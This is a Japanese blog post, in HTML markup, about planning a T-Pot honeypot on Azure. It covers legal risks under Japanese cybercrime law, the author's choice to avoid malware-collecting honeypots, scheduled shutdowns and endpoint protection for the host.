&lt;h2 id=&quot;記事について&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E8%A8%98%E4%BA%8B%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot; aria-label=&quot;記事について permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;記事について&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;本記事の内容は社会秩序に反する行為を推奨することを目的としたものではございません。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;自身の所有する環境、もしくは許可された環境以外への攻撃の試行は、「不正アクセス行為の禁止等に関する法律（不正アクセス禁止法）」に違反する可能性があること、予めご留意ください。&lt;/p&gt;
&lt;p&gt;またすべての発言は所属団体ではなく個人に帰属します。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E8%A8%98%E4%BA%8B%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot;&gt;記事について&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E4%BA%8B%E5%89%8D%E3%81%AB%E6%B1%BA%E3%82%81%E3%81%9F%E3%81%93%E3%81%A8%E7%A2%BA%E8%AA%8D%E3%81%97%E3%81%9F%E3%81%93%E3%81%A8&quot;&gt;事前に決めたこと&amp;#x26;確認したこと&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E8%AD%A6%E5%AF%9F%E3%81%AE%E3%81%8A%E4%B8%96%E8%A9%B1%E3%81%AB%E3%81%AA%E3%82%89%E3%81%AA%E3%81%84%E3%82%88%E3%81%86%E3%81%AB%E3%81%99%E3%82%8B&quot;&gt;警察のお世話にならないようにする&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%9E%E3%83%AB%E3%82%A6%E3%82%A7%E3%82%A2%E4%B8%8D%E6%AD%A3%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0%E3%82%92%E5%8F%96%E5%BE%97%E4%BF%9D%E6%8C%81%E3%81%97%E3%81%AA%E3%81%84&quot;&gt;マルウェア、不正プログラムを取得・保持しない&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#247%E7%A8%BC%E5%83%8D%E3%81%A7%E3%81%AF%E3%81%AA%E3%81%8F%E4%BB%BB%E6%84%8F%E3%81%AB%E8%B5%B7%E5%8B%95%E3%81%97%E3%81%9F%E6%99%82%E9%96%93%E4%BB%A5%E5%A4%96%E3%81%AF%E8%87%AA%E5%8B%95%E7%9A%84%E3%81%AB%E3%82%B7%E3%83%A3%E3%83%83%E3%83%88%E3%83%80%E3%82%A6%E3%83%B3%E3%81%95%E3%82%8C%E3%82%8B%E3%82%88%E3%81%86%E3%81%AB%E3%81%99%E3%82%8B&quot;&gt;24*7稼働ではなく、任意に起動した時間以外は自動的にシャットダウンされるようにする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%9B%E3%82%B9%E3%83%88%E3%81%AE%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E5%AF%BE%E7%AD%96%E3%82%92%E5%8D%81%E5%85%A8%E3%81%AB%E3%81%99%E3%82%8B&quot;&gt;ホストのセキュリティ対策を十全にする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%9B%E3%82%B9%E3%83%88%E3%81%AE%E7%A8%BC%E5%83%8D%E7%8A%B6%E6%B3%81%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6%E7%9B%A3%E8%A6%96%E3%81%A8%E9%80%9A%E7%9F%A5%E3%81%AE%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%82%92%E6%A7%8B%E7%AF%89%E3%81%99%E3%82%8B&quot;&gt;ホストの稼働状況について監視と通知のシステムを構築する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%8F%E3%83%8B%E3%83%BC%E3%83%9D%E3%83%83%E3%83%88%E3%81%B8%E3%81%AE%E6%8E%A5%E7%B6%9A%E3%81%AB%E3%81%AFazure%E3%81%A7%E6%A7%8B%E7%AF%89%E3%81%97%E3%81%9F%E8%B8%8F%E3%81%BF%E5%8F%B0%E3%81%AE%E3%83%9E%E3%82%B7%E3%83%B3%E3%82%92%E4%BD%BF%E3%81%86&quot;&gt;ハニーポットへの接続にはAzureで構築した踏み台のマシンを使う&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E8%B8%8F%E3%81%BF%E5%8F%B0%E3%82%B5%E3%83%BC%E3%83%90%E3%81%AB%E9%96%A2%E3%81%99%E3%82%8B%E8%BF%BD%E8%A8%98&quot;&gt;踏み台サーバに関する追記&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#azure%E3%81%AE%E8%A6%8F%E7%B4%84%E3%82%92%E5%AE%88%E3%82%8B&quot;&gt;Azureの規約を守る&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E7%A6%81%E6%AD%A2%E4%BA%8B%E9%A0%85&quot;&gt;禁止事項&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E8%A8%B1%E5%8F%AF%E3%81%95%E3%82%8C%E3%81%A6%E3%81%84%E3%82%8B%E3%81%93%E3%81%A8&quot;&gt;許可されていること&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#azure%E3%81%AB%E4%BB%AE%E6%83%B3%E3%83%9E%E3%82%B7%E3%83%B3%E3%82%92%E6%A7%8B%E7%AF%89%E3%81%99%E3%82%8B&quot;&gt;Azureに仮想マシンを構築する&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%8F%E3%83%8B%E3%83%BC%E3%83%9D%E3%83%83%E3%83%88%E7%92%B0%E5%A2%83%E7%94%A8%E3%81%AE%E3%83%AA%E3%82%BD%E3%83%BC%E3%82%B9%E3%82%B0%E3%83%AB%E3%83%BC%E3%83%97%E3%81%AE%E4%BD%9C%E6%88%90&quot;&gt;ハニーポット環境用のリソースグループの作成&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%8F%E3%83%8B%E3%83%BC%E3%83%9D%E3%83%83%E3%83%88%E3%83%9E%E3%82%B7%E3%83%B3%E3%81%AB%E9%81%A9%E7%94%A8%E3%81%99%E3%82%8B%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%82%B0%E3%83%AB%E3%83%BC%E3%83%97%E3%81%AE%E4%BD%9C%E6%88%90&quot;&gt;ハニーポットマシンに適用するセキュリティグループの作成&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%8F%E3%83%8B%E3%83%BC%E3%83%9D%E3%83%83%E3%83%88%E3%83%9E%E3%82%B7%E3%83%B3%E3%81%AE%E4%BB%AE%E6%83%B3%E3%83%8D%E3%83%83%E3%83%88%E3%83%AF%E3%83%BC%E3%82%AF%E3%81%AE%E4%BD%9C%E6%88%90&quot;&gt;ハニーポットマシンの仮想ネットワークの作成&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E4%BB%AE%E6%83%B3%E3%83%9E%E3%82%B7%E3%83%B3%E3%81%AE%E4%BD%9C%E6%88%90&quot;&gt;仮想マシンの作成&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%8F%E3%83%8B%E3%83%BC%E3%83%9D%E3%83%83%E3%83%88%E3%83%9E%E3%82%B7%E3%83%B3&quot;&gt;ハニーポットマシン&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E8%B8%8F%E3%81%BF%E5%8F%B0%E3%82%B5%E3%83%BC%E3%83%90&quot;&gt;踏み台サーバ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E8%B8%8F%E3%81%BF%E5%8F%B0%E3%82%B5%E3%83%BC%E3%83%90%E3%81%AE%E3%82%B5%E3%82%A4%E3%82%BA%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6%E8%BF%BD%E8%A8%98&quot;&gt;踏み台サーバのサイズについて(追記)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E7%92%B0%E5%A2%83%E3%81%AE%E3%82%BB%E3%83%83%E3%83%88%E3%82%A2%E3%83%83%E3%83%97&quot;&gt;環境のセットアップ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#dns%E5%90%8D%E3%81%AE%E6%A7%8B%E6%88%90&quot;&gt;DNS名の構成&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#azure-sentinel%E3%81%AE%E6%A7%8B%E7%AF%89&quot;&gt;Azure Sentinelの構築&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E8%B8%8F%E3%81%BF%E5%8F%B0%E3%82%B5%E3%83%BC%E3%83%90%E3%81%ABlinux-agent%E3%82%92%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B&quot;&gt;踏み台サーバにLinux Agentをインストールする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E8%B8%8F%E3%81%BF%E5%8F%B0%E3%82%B5%E3%83%BC%E3%83%90%E3%81%AE514%E3%83%9D%E3%83%BC%E3%83%88%E5%BE%85%E3%81%A1%E5%8F%97%E3%81%91%E3%82%92%E6%9C%89%E5%8A%B9%E5%8C%96%E3%81%99%E3%82%8B&quot;&gt;踏み台サーバの514ポート待ち受けを有効化する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#cloud-one%E3%81%AEsyslog%E3%82%A4%E3%83%99%E3%83%B3%E3%83%88%E3%82%92%E3%83%8F%E3%83%8B%E3%83%BC%E3%83%9D%E3%83%83%E3%83%88%E3%83%9E%E3%82%B7%E3%83%B3%E3%81%8B%E3%82%89%E8%B8%8F%E3%81%BF%E5%8F%B0%E3%82%B5%E3%83%BC%E3%83%90%E3%81%AB%E8%BB%A2%E9%80%81%E3%81%99%E3%82%8B%E3%82%88%E3%81%86%E3%81%AB%E6%A7%8B%E6%88%90%E3%81%99%E3%82%8B&quot;&gt;Cloud OneのSyslogイベントをハニーポットマシンから踏み台サーバに転送するように構成する&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E8%A3%9C%E8%B6%B3%E3%83%8F%E3%83%8B%E3%83%BC%E3%83%9D%E3%83%83%E3%83%88%E3%83%9E%E3%82%B7%E3%83%B3%E3%81%AE%E3%83%87%E3%82%A3%E3%82%B9%E3%82%AF%E6%8B%A1%E5%BC%B5&quot;&gt;補足：ハニーポットマシンのディスク拡張&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%B9%E3%83%8A%E3%83%83%E3%83%97%E3%82%B7%E3%83%A7%E3%83%83%E3%83%88%E3%81%AE%E4%BD%9C%E6%88%90&quot;&gt;スナップショットの作成&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#t-pot%E3%81%AE%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB&quot;&gt;T-Potのインストール&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#docker%E3%83%A6%E3%83%BC%E3%82%B6%E3%81%AE%E8%BF%BD%E5%8A%A0&quot;&gt;Dockerユーザの追加&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#ssh%E3%83%80%E3%82%A4%E3%83%8A%E3%83%9F%E3%83%83%E3%82%AF%E3%83%95%E3%82%A9%E3%83%AF%E3%83%BC%E3%83%87%E3%82%A3%E3%83%B3%E3%82%B0%E3%81%A7%E8%B8%8F%E3%81%BF%E5%8F%B0%E7%B5%8C%E7%94%B1%E3%81%A7t-pot%E3%81%AB%E6%8E%A5%E7%B6%9A&quot;&gt;SSHダイナミックフォワーディングで踏み台経由でT-Potに接続&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot;&gt;参考書籍&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;事前に決めたこと確認したこと&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E4%BA%8B%E5%89%8D%E3%81%AB%E6%B1%BA%E3%82%81%E3%81%9F%E3%81%93%E3%81%A8%E7%A2%BA%E8%AA%8D%E3%81%97%E3%81%9F%E3%81%93%E3%81%A8&quot; aria-label=&quot;事前に決めたこと確認したこと permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;事前に決めたこと&amp;#x26;確認したこと&lt;/h2&gt;
&lt;p&gt;とりあえずAzureでハニーポット環境を作るにあたって以下の2点について事前に決定&amp;#x26;確認を行いました&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;警察のお世話にならないようにする&lt;/li&gt;
&lt;li&gt;Azureの規約を守る&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;特に上記の2点に気を付けてやっていこうと思います。&lt;/p&gt;
&lt;h2 id=&quot;警察のお世話にならないようにする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E8%AD%A6%E5%AF%9F%E3%81%AE%E3%81%8A%E4%B8%96%E8%A9%B1%E3%81%AB%E3%81%AA%E3%82%89%E3%81%AA%E3%81%84%E3%82%88%E3%81%86%E3%81%AB%E3%81%99%E3%82%8B&quot; aria-label=&quot;警察のお世話にならないようにする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;警察のお世話にならないようにする&lt;/h2&gt;
&lt;p&gt;何よりもこれを重視してます笑&lt;/p&gt;
&lt;p&gt;普通に警察に逮捕・勾留、またはコインハイブ事件やWizard Bible事件みたいに略式起訴されたら、PCが押収されたり仕事ができなくなったりして詰む感じですね。&lt;/p&gt;
&lt;p&gt;実際に自分に全く罪はなくても、警察側の誤解で家宅捜索されたりする負けイベントが発生する場合もあるらしいので無理ゲーですが、できる対策は可能な限り取っていきたいと思います。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://yashio.hatenablog.com/entry/20220208/1644325200&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;逮捕にそなえる人生継続計画 - やしお&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;他の例でも、「レンタルサーバで運営していたサイトがクラッキングされた結果、警察の家宅捜索が入った」とか、詐欺サイトが運営されていたレンタルサーバの管理者が事情聴取されたとか、結構怖い話がちらほらあります。&lt;/p&gt;
&lt;p&gt;正直日本で生活している人間が、個人的にセキュリティ関連の活動をするのは結構リスクがあると考えてます。&lt;/p&gt;
&lt;p&gt;(それもあってずっとハニーポット建てるの避けてました。)&lt;/p&gt;
&lt;p&gt;とはいえやることに決めた以上はできるだけリスクを避けられる運用に取り組んでいこうと思います。&lt;/p&gt;
&lt;p&gt;具体的には、環境を建てることにした2022/02/09時点では以下の点を想定しています。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;マルウェア、不正プログラムを取得・保持しない&lt;/li&gt;
&lt;li&gt;24*7稼働ではなく、任意に起動した時間以外は自動的にシャットダウンされるようにする&lt;/li&gt;
&lt;li&gt;ホストのセキュリティ対策を十全にする&lt;/li&gt;
&lt;li&gt;ホストの稼働状況について監視と通知のシステムを構築する&lt;/li&gt;
&lt;li&gt;ハニーポットへの接続にはAzureで構築した踏み台のマシンを使う&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;マルウェア不正プログラムを取得保持しない&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%9E%E3%83%AB%E3%82%A6%E3%82%A7%E3%82%A2%E4%B8%8D%E6%AD%A3%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0%E3%82%92%E5%8F%96%E5%BE%97%E4%BF%9D%E6%8C%81%E3%81%97%E3%81%AA%E3%81%84&quot; aria-label=&quot;マルウェア不正プログラムを取得保持しない permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;マルウェア、不正プログラムを取得・保持しない&lt;/h3&gt;
&lt;p&gt;そもそも&lt;a href=&quot;https://github.com/telekom-security/tpotce&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;T-Pot&lt;/a&gt;は、ざっくり言うと様々なハニーポットを動かすことができるツールです。&lt;/p&gt;
&lt;p&gt;この中には、マルウェア収集を目的としたハニーポットもあります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://tech-lab.sios.jp/archives/26325&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ハニーポット is 何？実際に作って触ってみる 構築編 | SIOS Tech. Lab&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;今回は、このマルウェア収集を目的としたハニーポットは当面使用せずに運用しようと思います。&lt;/p&gt;
&lt;p&gt;というのも、&lt;a href=&quot;https://www.keishicho.metro.tokyo.lg.jp/kurashi/cyber/law/virus.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;不正指令電磁的記録に関する罪&lt;/a&gt;に引っかかるのが怖いからです。&lt;/p&gt;
&lt;p&gt;この法律ですが、「悪用目的での」マルウェアの保持を禁止する法律ではあるのですが、残念ながらこの基準はかなりあいまいな現状があるようです。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ウイルスの取得・保管罪とは&lt;/p&gt;
&lt;p&gt;正当な理由がないのに、その使用者の意図とは無関係に勝手に実行されるようにする目的で、コンピュータ・ウイルスやコンピュータ・ウイルスのソースコードを取得、保管する行為をいいます。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.keishicho.metro.tokyo.lg.jp/kurashi/cyber/law/virus.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;不正指令電磁的記録に関する罪　警視庁&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;下記サイトには、&lt;a href=&quot;https://twitter.com/it_giron&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;@it_giron&lt;/a&gt;さんが各県警に「不正指令電磁的記録に関する罪」の構成要件について開示請求を行った結果がまとまっており、非常に参考になります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://it-giron.com/262&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;「不正指令電磁的記録に関する罪」 各都道府県警への構成要件等の開示請求状況 | IT議論&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;247稼働ではなく任意に起動した時間以外は自動的にシャットダウンされるようにする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#247%E7%A8%BC%E5%83%8D%E3%81%A7%E3%81%AF%E3%81%AA%E3%81%8F%E4%BB%BB%E6%84%8F%E3%81%AB%E8%B5%B7%E5%8B%95%E3%81%97%E3%81%9F%E6%99%82%E9%96%93%E4%BB%A5%E5%A4%96%E3%81%AF%E8%87%AA%E5%8B%95%E7%9A%84%E3%81%AB%E3%82%B7%E3%83%A3%E3%83%83%E3%83%88%E3%83%80%E3%82%A6%E3%83%B3%E3%81%95%E3%82%8C%E3%82%8B%E3%82%88%E3%81%86%E3%81%AB%E3%81%99%E3%82%8B&quot; aria-label=&quot;247稼働ではなく任意に起動した時間以外は自動的にシャットダウンされるようにする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;24*7稼働ではなく、任意に起動した時間以外は自動的にシャットダウンされるようにする&lt;/h3&gt;
&lt;p&gt;当面は、Azureの自動シャットダウン機能を用いてハニーポットのマシンを夜間は停止して運用していこうと思います。&lt;/p&gt;
&lt;p&gt;ある程度運用が確立してきたら稼働時間を延ばしていこうと思います。&lt;/p&gt;
&lt;h3 id=&quot;ホストのセキュリティ対策を十全にする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%9B%E3%82%B9%E3%83%88%E3%81%AE%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E5%AF%BE%E7%AD%96%E3%82%92%E5%8D%81%E5%85%A8%E3%81%AB%E3%81%99%E3%82%8B&quot; aria-label=&quot;ホストのセキュリティ対策を十全にする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ホストのセキュリティ対策を十全にする&lt;/h3&gt;
&lt;p&gt;たぶんここが一番リスクが大きいように感じます。&lt;/p&gt;
&lt;p&gt;何かの理由でハニーポットが侵害されてBOT化した場合、他のユーザに対して攻撃を行ったり、不正なファイルの中継サーバになる可能性があります。&lt;/p&gt;
&lt;p&gt;これを防ぐために、セキュリティ対策と監視の仕組みを作っていきたいと思ってます。&lt;/p&gt;
&lt;p&gt;とりあえずハニーポットを構築するマシンでは、&lt;a href=&quot;https://www.trendmicro.com/ja_jp/business/products/hybrid-cloud/cloud-one-workload-security.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Trend Micro Cloud One Workload Security&lt;/a&gt;のAgentをインストールします。&lt;/p&gt;
&lt;p&gt;このセキュリティソフトですが、最大5台まで無料で管理でき、かつアンチマルウェアやホスト型IDS、重要ファイルの変更監視、アプリケーションのホワイトリスト運用などができます。&lt;/p&gt;
&lt;p&gt;（また、前の仕事で使ったことがあり、個人的に運用に精通しているという理由もあります）&lt;/p&gt;
&lt;p&gt;※ 以下追記&lt;/p&gt;
&lt;p&gt;なんと、2022/01/31よりライセンス方式が変更になり、5台までの無料利用ができなくなってしまったようです。。&lt;/p&gt;
&lt;p&gt;悲しい。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://community-trendmicro.force.com/solution/000290385&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;“Free - 5 Computers” End of Support for Trend Micro Cloud One - Workload Security and Deep Security as a Service&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;近いうちにOSSのEDRツールあたりに切り替えようと思います。&lt;/p&gt;
